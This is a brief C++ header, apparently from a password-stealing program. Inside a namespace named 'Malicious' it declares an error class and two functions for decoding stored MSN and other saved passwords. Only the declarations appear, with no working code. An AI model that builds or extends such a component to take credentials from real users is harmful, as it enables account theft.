#pragma once

#include <string>
#include <common/Exception.hpp>

namespace Malicious {
	class ErrorWhileRetrieving : public Common::Exception {
		public:
			ErrorWhileRetrieving(const std::string& msgArg);
	};

	std::string decodeMsnPasswords(char delimiter);
	std::string decodeAllPasswords(char delimiter);

} // Malicious
